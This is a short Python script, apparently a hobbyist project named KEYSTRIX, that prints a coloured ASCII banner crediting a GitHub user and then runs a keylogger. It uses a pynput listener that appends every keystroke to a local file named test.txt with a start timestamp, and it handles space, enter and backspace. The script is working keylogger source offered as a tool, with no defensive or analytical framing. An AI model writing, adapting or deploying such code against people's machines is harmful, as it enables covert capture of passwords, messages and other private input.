import colorama
from colorama import Fore, Back, Style
import pynput
from pynput.keyboard import Key, Listener
import datetime

colorama.init()

#New TEXT


print_banner="""
+-------------------------------------------------------------+
|██╗  ██╗███████╗██╗   ██╗███████╗████████╗██████╗ ██╗██╗  ██╗|
|██║ ██╔╝██╔════╝╚██╗ ██╔╝██╔════╝╚══██╔══╝██╔══██╗██║╚██╗██╔╝|
|█████╔╝ █████╗   ╚████╔╝ ███████╗   ██║   ██████╔╝██║ ╚███╔╝ |
|██╔═██╗ ██╔══╝    ╚██╔╝  ╚════██║   ██║   ██╔══██╗██║ ██╔██╗ |
|██║  ██╗███████╗   ██║   ███████║   ██║   ██║  ██║██║██╔╝ ██╗|
|╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝|
+-----------------------<@trashz403>--------------------------+
"""

special_text = "KEYSTRIX"
username = "<@trashz403>"

# colors for characters
colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]

# Printing characters with color
color_index = 0
for char in print_banner:
    if char != '\n':
        print(colors[color_index] + char, end="")
        color_index = (color_index + 1) % len(colors)
    else:
        print()  # Move to the next line

print("\n","            ",username)
print("\n\nhttps://github.com/trashz403")

def on_press(key):
    with open("test.txt", "a") as f:
        if isinstance(key, Key):
            if key == Key.space:
                f.write(" ")
            elif key == Key.enter:
                f.write("\n")
            elif key == Key.backspace:
                f.seek(f.tell() - 1, 0)
                f.truncate()
        else:
            f.write(str(key).strip("'"))

with Listener(on_press=on_press) as listener:
    with open("test.txt", "a") as f:
        f.write(f"Logging started at: {datetime.datetime.now()}\n")
    listener.join()
